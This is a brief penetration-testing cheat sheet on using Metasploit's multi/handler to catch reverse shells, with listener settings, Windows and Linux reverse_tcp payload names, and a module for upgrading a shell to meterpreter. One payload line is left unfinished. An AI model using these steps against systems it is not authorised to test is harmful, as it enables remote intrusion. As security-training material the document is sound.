# Reverse Shell

## Multi Handler

* Start the PostgreSQL service `service postgresql start`.
* Start the metasploit console `msfconsole`.
* `use exploit/multi/handler`.

## Setting Up a listener in multi handler

* `set lhost 192.168.1.10`.
* `set lport 4444`.
* Then we need to specify the payload,
  * netcat shell \([https://netsec.ws/?p=292](https://netsec.ws/?p=292)\)
    * windows listener `set payload windows/shell/reverse_tcp`
    * linux listener `set payload linux/x86/shell/reverse_tcp`
  * meterpreter shell
    * windows listener `payload windows/meterpreter/reverse_tcp`
    * linux listener payload linux

## Upgrade Shell to meterpreter shell

* You need to have a metasploit listener for netcat.
* You need to create a new session. Either Ctrl+z or `background`.
* Then we need to change the exploit first to "shell\_to\_meterpreter".
  * `use post/multi/manage/shell_to_meterpreter`
* 
![TCP connection states](../../../.gitbook/assets/image%20%2817%29.png)

